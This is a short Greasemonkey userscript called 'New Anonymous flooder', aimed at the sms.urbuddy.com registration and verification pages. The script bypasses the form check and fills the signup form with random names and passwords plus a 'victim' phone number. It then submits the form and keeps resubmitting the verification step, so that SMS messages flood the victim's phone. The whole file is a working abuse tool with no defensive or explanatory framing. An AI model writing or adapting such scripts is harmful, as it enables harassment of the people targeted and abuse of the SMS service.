// ==UserScript==
// @name          New Anonymous flooder
// @namespace     \m/\m/\m/
// @description   flooder sms
// @include       http://*sms.urbuddy.com/*
// ==/UserScript==

var victim=0; //Enter victims number here

if(document.location=="http://sms.urbuddy.com/register.php")
{
function checkform(){return true;}
document.getElementsByName("dnam")[0].value='asdas'+Math.floor(Math.random()*1456484);
document.getElementsByName("nam")[0].value='asdas'+Math.floor(Math.random()*1456484);
document.getElementsByName("phno")[0].value=victim;
document.getElementsByName("pass")[0].value='asdas'+Math.floor(Math.random()*1456484);
document.forms.fr.submit();
}
if(document.location=="http://sms.urbuddy.com/verify.php"||document.location=="http://sms.urbuddy.com/verify.php?phno="+victim+"&rcode=1")
document.forms.frm.submit();